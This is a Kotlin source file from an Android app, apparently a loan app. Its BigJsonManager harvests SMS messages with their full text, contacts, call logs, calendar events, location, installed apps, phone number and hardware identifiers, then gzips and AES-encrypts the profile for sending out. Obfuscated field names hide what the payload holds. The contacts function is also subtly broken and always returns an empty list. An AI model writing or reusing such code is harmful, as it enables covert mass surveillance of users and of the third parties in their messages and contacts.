@file:Suppress("DEPRECATION")

package pretimmediat.manager

import android.annotation.SuppressLint
import android.app.ActivityManager
import android.app.ActivityManager.MemoryInfo
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageInfo
import android.content.pm.PackageManager
import android.database.Cursor
import android.hardware.Sensor
import android.hardware.SensorManager
import android.net.ConnectivityManager
import android.net.Proxy
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.Build.VERSION
import android.os.Environment
import android.os.StatFs
import android.os.SystemClock
import android.os.storage.StorageManager
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.MediaStore.Audio.Media
import android.provider.Settings.Secure
import android.provider.Telephony
import android.telephony.CellInfo
import android.telephony.CellInfoCdma
import android.telephony.CellInfoGsm
import android.telephony.CellInfoLte
import android.telephony.CellInfoWcdma
import android.telephony.TelephonyManager
import android.text.TextUtils
import android.util.DisplayMetrics
import android.view.WindowManager
import compat.packagemanager.PackageManagerCompat
import eson.toJson
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.flowOn
import kotlinx.coroutines.flow.map
import logger.L
import pretimmediat.ext.aes
import pretimmediat.model.copy.AntarcticBoyConvenientSugar
import pretimmediat.model.copy.AverageMillionDate
import pretimmediat.model.copy.FriedImportantPracticeStory
import pretimmediat.model.copy.InlandFamilySplendidHopefulToday
import pretimmediat.model.copy.MercifulSheetMedicalMarketRecord
import pretimmediat.model.copy.MessyFatBorder
import pretimmediat.model.copy.MinusPieBuildingPath
import pretimmediat.model.copy.MobileKangarooMathematics
import pretimmediat.model.copy.PureTeamworkDrunkLuck
import pretimmediat.model.copy.SwissPathCleverFreedom
import pretimmediat.model.copy.TastelessDecorationArt
import pretimmediat.model.copy.UnfitPopularBiscuit
import pretimmediat.model.copy.UnhealthyShowLeafTriangleRussia
import pretimmediat.model.copy.UpperSteepJanuary
import pretimmediat.model.copy.UsualSolidActualKid
import pretimmediat.property.Properties
import pretimmediat.util.MacUtil
import sugar.ext.systemService
import vector.datastore.preference.sync
import vector.ext.getInt
import vector.ext.getIntOrNull
import vector.ext.getLong
import vector.ext.getLongOrNull
import vector.ext.getString
import vector.ext.getStringOrNull
import vector.ext.isNotNullOrEmpty
import vector.ext.safeQuery
import vector.util.DeviceIdUtil
import vector.util.Dir
import vector.util.PackageUtil
import vector.util.TimeFormatter
import java.io.BufferedReader
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileReader
import java.io.IOException
import java.lang.reflect.Method
import java.util.Locale
import java.util.TimeZone
import java.util.zip.GZIPOutputStream
import kotlin.math.pow
import kotlin.math.sqrt


/**
 * 大Json数据收集
 */
object BigJsonManager {

    private const val LOG_TAG = "BigJsonManager"

    fun bigJsonFlow(context: Context) = flow {
        val json = UnfitPopularBiscuit().apply {
            inlandFamilySplendidHopefulToday = getHardware(context)
            unhealthyShowLeafTriangleRussia = getStorage(context)
            antarcticBoyConvenientSugar = getGeneralData(context)
            tastelessDecorationArt = catch { getOtherData(context) }
            swissPathCleverFreedom = catch { getApplications(context) }
            usualSolidActualKid = catch { getContacts(context) }
            mercifulSheetMedicalMarketRecord = catch { getSms(context) }
            mobileKangarooMathematics = catch { getLocation() }
            pureTeamworkDrunkLuck = catch { getBatteryStatus(context) }
            minusPieBuildingPath = catch { getPublicIp(context) }
            upperSteepJanuary = catch { getCalendar(context) }
            averageMillionDate = catch { getCalls(context) }
            hungryInstructionPrettyTailLeague = catch { getAudioInternal(context) }
            fastExamFacialLoaf = catch { getImagesInternal(context) }
            saltyHardworkingExistenceHoney = catch { getVideoInternal(context) }
            firstSunset = PackageUtil.appVersionCode.toString()
            strangeHarmlessMarch = PackageUtil.appVersionName
            interestingSettlementPureSummaryStage = context.packageName
            nationalSoupDifferentShaverLondon = System.currentTimeMillis()
        }.toJson()
        L.d(LOG_TAG, "bigJsonFlow, json = $json")
        emit(gzip(json))
    }.map { gzipJson ->
        L.d(LOG_TAG, "bigJsonFlow, gzipJson = $gzipJson")
        gzipJson.aes()
    }.flowOn(Dispatchers.IO)

    private fun getLocation(): MobileKangarooMathematics {
        return MobileKangarooMathematics().apply {
            val location = Properties.location.sync().getOrNull()
            troublesomeRulerSalesgirl = location
            sweetSummaryFemalePlaygroundSolidPainting = location
            electricalBrownHolidayDam = location
            friedImportantPracticeStory = FriedImportantPracticeStory().apply {
                irishKindDoorTram = Properties.latitude.sync().getOrNull()
                egyptianChequeBlueDisagreement = Properties.longitude.sync().getOrNull()
            }
        }
    }

    private fun getBatteryStatus(context: Context): PureTeamworkDrunkLuck {
        return PureTeamworkDrunkLuck().apply {
            val manager = context.systemService<BatteryManager>()
            val dianliang = manager.getIntProperty(4)

            considerateCousinTenseSealSeriousStomach = dianliang.toString()

            val intent: Intent? = context.registerReceiver(
                null as BroadcastReceiver?,
                IntentFilter("android.intent.action.BATTERY_CHANGED")
            )
            val k = intent?.getIntExtra("plugged", -1)
            when (k) {
                1 -> {
                    convenientPaceProvinceRapidRevision = "0"
                    instantKingSureGuitarBroadJustice = "1"
                    suchSafeEgyptIce = "1"
                }

                2 -> {
                    convenientPaceProvinceRapidRevision = "1"
                    suchSafeEgyptIce = "0"
                    instantKingSureGuitarBroadJustice = "1"
                }

                else -> {
                    convenientPaceProvinceRapidRevision = "0"
                    suchSafeEgyptIce = "0"
                    instantKingSureGuitarBroadJustice = "0"
                }
            }
        }
    }

    private fun getPublicIp(context: Context): MinusPieBuildingPath {
        val address = IpManager.getInstance(context).getAddress()
        return MinusPieBuildingPath().apply {
            hugeStoneAncientJournalist = address
            ableHawkBlueRoot = address
        }
    }

    private fun getAudioInternal(context: Context): Int {
        var result = 0
        context.contentResolver.safeQuery(
            Media.INTERNAL_CONTENT_URI,
            arrayOf(
                "date_added",
                "date_modified",
                "duration",
                "mime_type",
                "is_music",
                "year",
                "is_notification",
                "is_ringtone",
                "is_alarm"
            ),
            null,
            null,
            "title_key"
        ) { cursor ->
            while (cursor.moveToNext()) {
                result++
            }
        }
        return result
    }

    private fun getImagesInternal(context: Context): Int {
        var result = 0
        context.contentResolver.safeQuery(
            MediaStore.Images.Media.INTERNAL_CONTENT_URI,
            arrayOf(
                "datetaken",
                "date_added",
                "date_modified",
                "height",
                "width",
                "latitude",
                "longitude",
                "mime_type",
                "title",
                "_size"
            ),
            null,
            null,
            null
        ) { cursor ->
            while (cursor.moveToNext()) {
                result++
            }
        }
        return result
    }

    private fun getVideoInternal(context: Context): Int {
        var result = 0
        context.contentResolver.safeQuery(
            MediaStore.Video.Media.INTERNAL_CONTENT_URI,
            arrayOf("date_added"),
            null,
            null,
            null
        ) { cursor ->
            while (cursor.moveToNext()) {
                result++
            }
        }
        return result
    }

    @Throws(IOException::class)
    private fun gzip(str: String): String {
        if (str.isEmpty()) {
            return str
        }
        // 建立一个新的输出流
        val out = ByteArrayOutputStream()
        // 使用默认缓冲区大小建立新的输出流
        val gzip = GZIPOutputStream(out)
        // 将字节写入此输出流
        gzip.write(str.toByteArray(charset("utf-8"))) // 由于后台默认字符集有多是GBK字符集，因此此处需指定一个字符集
        gzip.close()
        // 使用指定的 charsetName，经过解码字节将缓冲区内容转换为字符串
        return out.toString("ISO-8859-1")
    }

    @SuppressLint("PrivateApi")
    private fun getHardware(context: Context): InlandFamilySplendidHopefulToday {
        fun getPhysicalSize(): String {
            val display = (context.systemService<WindowManager>()).defaultDisplay
            val displayMetrics = DisplayMetrics()
            display.getMetrics(displayMetrics)
            return sqrt(
                (displayMetrics.heightPixels.toFloat() / displayMetrics.ydpi).toDouble()
                    .pow(2.0) + (displayMetrics.widthPixels.toFloat() / displayMetrics.xdpi).toDouble()
                    .pow(2.0)
            ).toString()
        }

        fun getSerialNumber(): String {
            val serial: String?
            val c = Class.forName("android.os.SystemProperties")
            val get: Method = c.getMethod("get", String::class.java)
            serial = get.invoke(c, "ro.serialnocustom") as String?

            if (serial == null) {
                try {
                    val clazz = Class.forName("android.os.SystemProperties")

                    return clazz.getMethod("get", String::class.java)
                        .invoke(clazz, "ro.serialno") as String
                } catch (var1: Exception) {
                    return ""
                }
            }
            return serial
        }

        fun getCpuNum(): String {
            return Runtime.getRuntime().availableProcessors().toString()
        }

        return InlandFamilySplendidHopefulToday(
            catch { Build.BRAND },
            catch { VERSION.SDK_INT },
            catch { VERSION.RELEASE },
            catch { VERSION.RELEASE },
            catch { Build.BRAND },
            catch { getPhysicalSize() },
            catch { getSerialNumber() },
            catch { Build.TIME },
            catch { context.resources.displayMetrics.heightPixels },
            catch { context.resources.displayMetrics.widthPixels },
            catch { Build.BOARD },
            catch { getCpuNum() },
            DeviceIdUtil.id,
            DeviceIdUtil.id
        )
    }

    private fun getStorage(context: Context): UnhealthyShowLeafTriangleRussia {
        fun getRamTotalSize(): String {
            val memoryInfo = MemoryInfo()
            context.systemService<ActivityManager>().getMemoryInfo(memoryInfo)
            val stringBuilder = StringBuilder()
            stringBuilder.append(memoryInfo.totalMem)
            stringBuilder.append("")
            return stringBuilder.toString()
        }

        fun getRamUsableSize(): String {
            val memoryInfo = MemoryInfo()
            context.systemService<ActivityManager>().getMemoryInfo(memoryInfo)
            val stringBuilder = java.lang.StringBuilder()
            stringBuilder.append(memoryInfo.availMem)
            stringBuilder.append("")
            return stringBuilder.toString()
        }

        fun getMemoryCardSize(): Long {
            if (Dir.Public.isExternalStorageWritable) {
                val directory = Environment.getExternalStorageDirectory()
                val stat = StatFs(directory.path)
                return stat.blockCountLong * stat.blockSizeLong
            } else {
                return 0L
            }
        }

        fun getMemoryCardUsableSize(): Long {
            if (Dir.Public.isExternalStorageWritable) {
                val path = Environment.getExternalStorageDirectory()
                val stat = StatFs(path.path)
                return stat.availableBlocksLong * stat.blockSizeLong
            } else {
                return 0L
            }
        }

        fun internalStorageTotal(): Long {
            val path = Environment.getDataDirectory()
            val stat = StatFs(path.path)
            return stat.blockCountLong * stat.blockSizeLong
        }

        fun getInternalStorageUsable(): Long {
            val path = Environment.getDataDirectory()
            val stat = StatFs(path.getPath())
            return stat.availableBlocksLong * stat.blockSizeLong
        }

        fun getRamTotalPreSize(): Long {
            val dir = "/proc/meminfo"
            val fr = FileReader(dir)
            val br = BufferedReader(fr, 2048)
            val memoryLine = br.readLine()
            val subMemoryLine = memoryLine.substring(memoryLine.indexOf("MemTotal:"))
            br.close()
            return subMemoryLine.replace("\\D+".toRegex(), "").toInt() * 1024L
        }

        fun getAppMaxMemory(): Long {
            return Runtime.getRuntime().maxMemory()
        }

        fun getAppAvailableMemory(): Long {
            return Runtime.getRuntime().totalMemory()
        }

        fun getAppFreeMemory(): Long {
            return Runtime.getRuntime().freeMemory()
        }

        val memoryCardSize = catch { getMemoryCardSize() } ?: 0L
        val memoryCardUsableSize = catch { getMemoryCardUsableSize() } ?: 0L
        val memoryCardSizeUse = memoryCardSize - memoryCardUsableSize

        return UnhealthyShowLeafTriangleRussia(
            catch { getRamTotalSize() },
            catch { getRamUsableSize() },
            memoryCardSize.toString(),
            memoryCardUsableSize.toString(),
            memoryCardSizeUse.toString(),
            catch { internalStorageTotal().toString() },
            catch { getInternalStorageUsable().toString() },
            if (containsSdcard(context, false)) 1 else 0,
            if (containsSdcard(context, true)) 1 else 0,
            catch { getRamTotalPreSize().toString() },
            catch { getAppMaxMemory().toString() },
            catch { getAppAvailableMemory().toString() },
            catch { getAppFreeMemory().toString() }
        )
    }

    @SuppressLint("HardwareIds,MissingPermission")
    private fun getGeneralData(context: Context): AntarcticBoyConvenientSugar {

        fun getAndId(): String? {
            return Secure.getString(context.applicationContext.contentResolver, "android_id")
        }

        fun getPhoneType(): String {
            val manager = context.systemService<TelephonyManager>()
            val phoneType = manager.phoneType

            return when (phoneType) {
                TelephonyManager.PHONE_TYPE_NONE -> "None"
                TelephonyManager.PHONE_TYPE_GSM -> "GSM"
                TelephonyManager.PHONE_TYPE_CDMA -> "CDMA"
                TelephonyManager.PHONE_TYPE_SIP -> "SIP"
                else -> "Unknown"
            }
        }

        fun getLocaleIso3Language(): String {
            return context.resources.configuration.locale.getISO3Language();
        }

        fun getLocaleDisplayLanguage(): String {
            return Locale.getDefault().displayLanguage
        }

        fun getLocaleIso3Country(): String {
            return context.resources.configuration.locale.getISO3Country()
        }

        @SuppressLint("MissingPermission")
        fun getPhoneNumber(): String? {
            val tm = context.systemService<TelephonyManager>()
            val tel = tm.line1Number
            return tel
        }

        fun getNetworkOperatorName(): String {
            var networkOperatorName = ""
            try {
                val manager = context.systemService<TelephonyManager>()
                networkOperatorName = manager.networkOperatorName
            } catch (E: java.lang.Exception) {
                E.printStackTrace()
            }
            if (TextUtils.isEmpty(networkOperatorName)) {
                networkOperatorName = "Unknown"
            }
            return networkOperatorName
        }

        fun getNetworkType(): String {
            val cm = context.systemService<ConnectivityManager>()
            val info = cm.activeNetworkInfo
            if (info != null && info.isAvailable) {
                when (info.type) {
                    ConnectivityManager.TYPE_WIFI -> {
                        return "wifi"
                    }

                    ConnectivityManager.TYPE_MOBILE -> {
                        when (info.subtype) {
                            TelephonyManager.NETWORK_TYPE_GSM, TelephonyManager.NETWORK_TYPE_GPRS, TelephonyManager.NETWORK_TYPE_CDMA, TelephonyManager.NETWORK_TYPE_EDGE, TelephonyManager.NETWORK_TYPE_1xRTT, TelephonyManager.NETWORK_TYPE_IDEN -> return "2G"

                            TelephonyManager.NETWORK_TYPE_TD_SCDMA, TelephonyManager.NETWORK_TYPE_EVDO_A, TelephonyManager.NETWORK_TYPE_UMTS, TelephonyManager.NETWORK_TYPE_EVDO_0, TelephonyManager.NETWORK_TYPE_HSDPA, TelephonyManager.NETWORK_TYPE_HSUPA, TelephonyManager.NETWORK_TYPE_HSPA, TelephonyManager.NETWORK_TYPE_EVDO_B, TelephonyManager.NETWORK_TYPE_EHRPD, TelephonyManager.NETWORK_TYPE_HSPAP -> return "3G"

                            TelephonyManager.NETWORK_TYPE_IWLAN, TelephonyManager.NETWORK_TYPE_LTE -> return "4G"

                            TelephonyManager.NETWORK_TYPE_NR -> return "5G"
                            else -> {
                                val subtypeName = info.subtypeName
                                return if (subtypeName.equals("TD-SCDMA", ignoreCase = true)
                                    || subtypeName.equals("WCDMA", ignoreCase = true)
                                    || subtypeName.equals("CDMA2000", ignoreCase = true)
                                ) {
                                    "3G"
                                } else {
                                    "UNKNOWN"
                                }
                            }
                        }
                    }

                    else -> {
                        return "UNKNOWN"
                    }
                }
            }
            return "NETWORK_NO"
        }

        fun getTimeZoneId(): String {
            val tz: TimeZone = TimeZone.getDefault()
            val strTz: String = tz.getDisplayName(false, 0)
            return strTz
        }

        fun getLanguage(): String {
            val locale = context.resources.configuration.locale
            return locale.language
        }

        fun getIsUsingProxyPort(): Boolean {
            val proxyAddress = System.getProperty("http.proxyHost")
            val portStr = System.getProperty("http.proxyPort")
            val proxyPort = (portStr ?: "-1").toInt()

            return proxyAddress.isNotNullOrEmpty() && proxyPort != -1
        }

        fun getIsUsingVpn(): Boolean {
            val defaultHost = Proxy.getDefaultHost()
            return !TextUtils.isEmpty(defaultHost)
        }

        fun getIsUsbDebug(): Boolean {
            return Secure.getInt(context.contentResolver, "adb_enabled", 0) > 0
        }

        fun getElapsedRealTime(): Long {
            return SystemClock.elapsedRealtime()
        }

        fun getUptimeMillis(): Long {
            return SystemClock.uptimeMillis()
        }

        fun getSensorList(): List<MessyFatBorder> {
            val sensorList = mutableListOf<MessyFatBorder>()
            try {
                val sensorManager = context.systemService<SensorManager>()
                val sensors = sensorManager.getSensorList(-1)
                val var3: Iterator<*> = sensors.iterator()
                while (var3.hasNext()) {
                    val sensor = var3.next() as Sensor
                    sensorList.add(
                        MessyFatBorder(
                            sensor.type.toString(),
                            sensor.name.toString(),
                            sensor.version.toString(),
                            sensor.vendor.toString(),
                            sensor.maximumRange.toString(),
                            sensor.minDelay.toString(),
                            sensor.power.toString(),
                            sensor.resolution.toString()
                        )
                    )
                }
            } catch (e: Exception) {
                L.e(e)
            }

            return sensorList
        }

        return AntarcticBoyConvenientSugar(
            Properties.gaid.sync().getOrNull(),
            catch { getAndId() },
            catch { getPhoneType() },
            catch { MacUtil.getMac(context) },
            catch { getLocaleIso3Language() },
            catch { getLocaleDisplayLanguage() },
            catch { getLocaleIso3Country() },
            DeviceIdUtil.id,
            catch { getPhoneNumber() } ?: "",
            catch { getNetworkOperatorName() },
            catch { getNetworkType() },
            catch { getTimeZoneId() },
            catch { getLanguage() },
            catch { getIsUsingProxyPort() },
            catch { getIsUsingVpn() },
            catch { getIsUsbDebug() },
            catch { getElapsedRealTime() },
            System.currentTimeMillis(),
            catch { getUptimeMillis() },
            catch { getSensorList() }
        )
    }

    @SuppressLint("MissingPermission,HardwareIds")
    private fun getOtherData(context: Context): TastelessDecorationArt {
        fun getRootJailbreak(): Boolean {
            return !(!File("/system/bin/su").exists() && !File("/system/xbin/su").exists())
        }

        fun getLastBootTime(): Long {
            return System.currentTimeMillis() - SystemClock.elapsedRealtimeNanos() / 1000000L
        }

        fun getSimulator(): Boolean {
            val tm = context.systemService<TelephonyManager>()
            val imei = tm.deviceId
            return if (imei != null && imei == "000000000000000") {
                true
            } else {
                Build.MODEL == "sdk" || Build.MODEL == "google_sdk"
            }
        }

        fun getDbm(): String {
            var dbm = -1
            val tm = context.systemService<TelephonyManager>()

            try {
                val cellInfoList = tm.allCellInfo
                if (null != cellInfoList) {
                    val var3: Iterator<*> = cellInfoList.iterator()

                    while (var3.hasNext()) {
                        val cellInfo = var3.next() as CellInfo
                        when (cellInfo) {
                            is CellInfoGsm -> {
                                val cellSignalStrengthGsm = cellInfo.cellSignalStrength
                                dbm = cellSignalStrengthGsm.dbm
                            }

                            is CellInfoCdma -> {
                                val cellSignalStrengthCdma = cellInfo.cellSignalStrength
                                dbm = cellSignalStrengthCdma.dbm
                            }

                            is CellInfoWcdma -> {
                                val cellSignalStrengthWcdma = cellInfo.cellSignalStrength
                                dbm = cellSignalStrengthWcdma.dbm
                            }

                            is CellInfoLte -> {
                                val cellSignalStrengthLte = cellInfo.cellSignalStrength
                                dbm = cellSignalStrengthLte.dbm
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                L.e(e)
            }

            return dbm.toString()
        }

        fun getTotalBootTime(): String {
            return SystemClock.elapsedRealtime().toString()
        }

        fun getTotalBootTimeWake(): String {
            return SystemClock.uptimeMillis().toString() + ""
        }

        return TastelessDecorationArt().apply {
            prettyTrainerRectangleKindMeaning =
                if (catch { getRootJailbreak() } == true) "1" else "0"
            harmfulFancyJewelTechnicalLounge = catch { getLastBootTime() }.toString()
            mercifulHotClassroom = "1"
            fortunateDealSureSpellingCivilPatient =
                if (catch { getSimulator() } == true) "1" else "0"
            blankSummerTobacco = getDbm()
            northSorrowChemistEnglishEgypt = catch { getTotalBootTime() }
            helpfulConclusionPersonalMakeIndependentSide = catch { getTotalBootTimeWake() }
        }
    }

    @SuppressLint("QueryPermissionsNeeded")
    private fun getApplications(context: Context): List<SwissPathCleverFreedom> {
        val packages: List<PackageInfo> = PackageManagerCompat.getInstalledPackages(
            context,
            PackageManager.GET_ACTIVITIES or PackageManager.GET_SERVICES
        )
        L.d(LOG_TAG, "getApplications, packages = ${packages.size}")
        val applications = mutableListOf<SwissPathCleverFreedom>()
        packages.forEach { packageInfo ->
            try {
                applications.add(SwissPathCleverFreedom().apply {
                    unhappyDaughterParticularSaltAsleepKid =
                        packageInfo.applicationInfo?.loadLabel(context.packageManager).toString()
                    betterCelebrationAloneVariousPity = packageInfo.packageName
                    paleBoundSafetyNearChallenge = packageInfo.firstInstallTime
                    strictMaterial = packageInfo.versionName
//                    firstPersonPacificSouvenirs =
//                        if ((packageInfo.applicationInfo.flags and 1) == 0) 0 else 1
                    goodPastBackLeader = packageInfo.versionCode
//                    disabledPestBlanket = packageInfo.applicationInfo.flags
                    constantUselessHandsomeFall = packageInfo.lastUpdateTime
                })
            } catch (e: Exception) {
                L.e(LOG_TAG, e)
            }
        }

        return applications
    }

    private fun getContacts(context: Context): List<UsualSolidActualKid> {
        val list = mutableListOf<UsualSolidActualKid>()
        context.contentResolver.safeQuery(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP,
                ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED,
                ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED,
                ContactsContract.CommonDataKinds.Phone.LAST_TIME_USED,
            ),
            null,
            null,
            null
        ) { cursor ->
            while (cursor.moveToNext()) {
                UsualSolidActualKid().apply {
                    briefBeehiveAllHandkerchief =
                        cursor.getLong(ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED)
                    greedyRevisionPossibilitySmog =
                        cursor.getString(ContactsContract.CommonDataKinds.Phone.NUMBER)
                    troublesomeLateCanadaMovement =
                        cursor.getString(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    arabPigPencil =
                        cursor.getString(ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED)
                    constantUselessHandsomeFall =
                        cursor.getLong(ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP)
                    nextUnsafeSoutheast =
                        cursor.getLong(ContactsContract.CommonDataKinds.Phone.LAST_TIME_USED)
                }
            }
        }
        return list
    }

    private fun getSms(context: Context): List<MercifulSheetMedicalMarketRecord> {
        val list = mutableListOf<MercifulSheetMedicalMarketRecord>()
        context.contentResolver.safeQuery(
            Telephony.Sms.CONTENT_URI,
            arrayOf(
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.PERSON,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE,
                Telephony.Sms.READ,
                Telephony.Sms.STATUS,
                Telephony.Sms.SEEN,
                Telephony.Sms.DATE_SENT
            ),
            null,
            null,
            Telephony.Sms.DEFAULT_SORT_ORDER
        ) { cursor ->
            while (cursor.moveToNext()) {
                list.add(MercifulSheetMedicalMarketRecord().apply {
                    upperDollHalfSign = cursor.getString(Telephony.Sms.ADDRESS)
                    unpleasantInterval = cursor.getString(Telephony.Sms.BODY)
                    necessaryMemorialHighAccent = cursor.getLong(Telephony.Sms.DATE)
                    cubicHobbySweatYard = cursor.getInt(Telephony.Sms.TYPE)
                    heavyConstructionConvenienceTreasure = cursor.getInt(Telephony.Sms._ID)
                    secondSkilledFactoryCarelessPillow = cursor.getLong(Telephony.Sms.DATE_SENT)
                    kindNieceFemaleThroatColdMexico = cursor.getInt(Telephony.Sms.READ)
                    nearbyBlueFriend = cursor.getInt(Telephony.Sms.SEEN)
                    leadingTemple = cursor.getInt(Telephony.Sms.STATUS)
                    cleverRecentBoxChampion = cursor.getInt(Telephony.Sms.PERSON)
                })
            }
        }

        return list
    }

    private fun getCalendar(context: Context): List<UpperSteepJanuary> {
        val list = mutableListOf<UpperSteepJanuary>()
        context.contentResolver.safeQuery(
            Uri.parse("content://com.android.calendar/events"),
            null,
            null,
            null,
            null
        ) { cursor ->
            while (cursor.moveToNext()) {
                val eventTitle = cursor.getString("title")
                val description = cursor.getStringOrNull("description")
                val location = cursor.getString("eventLocation")
                val dtstart = cursor.getString("dtstart")
                val startTime = TimeFormatter.convert(dtstart, TimeFormatter.FormatStyle.FULL_TIME_24H)
                val dtend = cursor.getString("dtend")
                val endTime = TimeFormatter.convert(dtend, TimeFormatter.FormatStyle.FULL_TIME_24H)

                list.add(UpperSteepJanuary().apply {
                    arabicMicrowaveEitherBacteriumBlouse = eventTitle
                    plainNicePlayroomBothMay = description ?: eventTitle
                    mobileKangarooMathematics = location
                    activeSomeonePuzzle = startTime
                    valuableGownGrandBattlegroundMotor = endTime
                })
            }
        }

        return list
    }

    private fun getCalls(context: Context): List<AverageMillionDate> {
        val arr = mutableListOf<AverageMillionDate>()
        val uri: Uri = CallLog.Calls.CONTENT_URI
        val projection = arrayOf(
            CallLog.Calls.DATE,  // 日期
            CallLog.Calls.NUMBER,  // 号码
            CallLog.Calls.TYPE,  // 类型
            CallLog.Calls.CACHED_NAME,  // 名字
            CallLog.Calls._ID,  // id
            CallLog.Calls.DURATION,
            CallLog.Calls.NEW
        )
        context.contentResolver.safeQuery(
            uri,
            projection,
            null,
            null,
            CallLog.Calls.DEFAULT_SORT_ORDER
        ) { cursor: Cursor ->
            while (cursor.moveToNext()) {
                val number = cursor.getString(CallLog.Calls.NUMBER)
                val cachedName = cursor.getString(CallLog.Calls.CACHED_NAME) // 缓存的名称与电话号码，如果它的存在
                arr.add(AverageMillionDate().apply {
                    mistakenDevelopment = cursor.getIntOrNull(CallLog.Calls._ID) ?: 0
                    cubicHobbySweatYard = cursor.getIntOrNull(CallLog.Calls.TYPE) ?: 0
                    asianCarefulLab = cursor.getIntOrNull(CallLog.Calls.NEW) ?: 0
                    swiftFactoryPossibleChineseMeans = cachedName.ifEmpty {
                        number
                    }
                    greedyRevisionPossibilitySmog = number
                    unpleasantBurialAnySeveralInstrument =
                        cursor.getLongOrNull(CallLog.Calls.DATE) ?: 0L
                    greenSeriousBroadcastClassroom =
                        cursor.getLongOrNull(CallLog.Calls.DURATION) ?: 0L
                })
            }
        }
        return arr
    }

    private fun <T> catch(block: () -> T): T? {
        try {
            return block()
        } catch (e: Exception) {
            L.e(LOG_TAG, e)
            return null
        }
    }

    private fun containsSdcard(context: Context, canRemovable: Boolean): Boolean {
        val storageManager = context.systemService<StorageManager>()
        try {
            val storageVolumeClazz = Class.forName("android.os.storage.StorageVolume")
            val getVolumeList: Method = storageManager.javaClass.getMethod("getVolumeList")
            val isRemovable = storageVolumeClazz.getMethod("isRemovable")

            @Suppress("UNCHECKED_CAST")
            val result: Array<Any> = getVolumeList.invoke(storageManager) as Array<Any>
            val length: Int = result.size

            for (i in 0 until length) {
                val storageVolumeElement: Any = result[i]
                val removable = isRemovable.invoke(storageVolumeElement) as Boolean
                if (removable == canRemovable) {
                    return true
                }
            }
        } catch (e: Exception) {
            L.e((e))
        }
        return false
    }
}